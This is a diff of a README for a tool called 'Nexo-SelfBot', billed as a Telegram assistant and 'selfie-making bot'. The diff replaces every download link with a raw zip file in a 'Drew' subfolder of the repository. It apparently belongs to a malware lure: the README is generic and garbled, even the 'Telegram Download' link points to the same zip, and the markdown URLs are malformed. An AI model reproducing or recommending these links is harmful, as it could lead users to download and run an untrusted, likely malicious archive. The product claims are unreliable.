@@ -1,7 +1,7 @@
 # 🤖 Nexo-SelfBot - Your Smart Assistant for Daily Tasks
 
 ## 📥 Download Now
-[![Download Nexo-SelfBot](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip%20Now-Click%https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip)](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip)
+[![Download Nexo-SelfBot](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip%20Now-Click%https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip)](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip)
 
 ## 🚀 Getting Started
 Nexo SelfBot is a friendly selfie-making bot and virtual assistant available on Telegram. It features over 100 tools to help you manage tasks more easily. You don't need technical skills to get started. Follow these simple steps to download and run the application.
@@ -14,7 +14,7 @@ To use Nexo SelfBot, ensure your system meets the following requirements:
 - **Telegram App**: Make sure you have Telegram installed on your device.
 
 ## 📥 Download & Install
-To get started with Nexo SelfBot, visit this page to download: [Nexo-SelfBot Releases](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip).
+To get started with Nexo SelfBot, visit this page to download: [Nexo-SelfBot Releases](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip).
 
 1. **Visit the Releases Page**: Click the link above or go to the GitHub repository.
 2. **Choose Your Version**: Look for the latest release. Each release will be listed with version numbers and dates.
@@ -50,8 +50,8 @@ Absolutely! Feedback is very welcome. You can send your suggestions directly thr
 Currently, Nexo SelfBot runs on Telegram, which is available on both mobile and desktop. This makes it easy to access your virtual assistant from any device.
 
 ## 🔗 Useful Links
-- [Nexo-SelfBot Releases](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip)
-- [Telegram Download](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip)
+- [Nexo-SelfBot Releases](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip)
+- [Telegram Download](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip)
 
 ## 🤝 Contributing
 If you’d like to contribute to Nexo SelfBot or improve its features, feel free to fork the repository. Follow the contribution guidelines for proper steps.
@@ -59,4 +59,4 @@ If you’d like to contribute to Nexo SelfBot or improve its features, feel free
 ## 🎉 Acknowledgements
 Thank you for choosing Nexo SelfBot. We appreciate your support and hope it significantly enhances your daily tasks.
 
-[![Download Nexo-SelfBot](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip%20Now-Click%https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip)](https://raw.githubusercontent.com/Constantiagraduated858/Nexo-SelfBot/main/Drew/Nexo-SelfBot_2.3.zip)
+[![Download Nexo-SelfBot](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip%20Now-Click%https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip)](https://github.com/Constantiagraduated858/Nexo-SelfBot/raw/refs/heads/main/Drew/Self-Bot-Nexo-2.6.zip)
